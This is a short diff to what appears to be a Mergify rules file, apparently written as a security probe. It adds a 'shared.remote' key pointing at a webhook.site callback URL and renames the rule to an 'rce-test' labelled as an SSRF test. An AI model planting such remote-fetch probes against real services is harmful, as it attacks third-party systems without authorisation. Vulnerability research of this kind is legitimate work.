@@ -1,10 +1,9 @@
+shared:
+  remote: https://webhook.site/6b7749e2-20f8-48bf-8234-e4056fce9cf8
 pull_request_rules:
-  - name: test-label
+  - name: rce-test-1785361985
     conditions:
       - base=main
     actions:
-      label:
-        add:
-          - mergify-works
       comment:
-        message: Mergify rule evaluation works! 🎯
+        message: shared.remote SSRF test
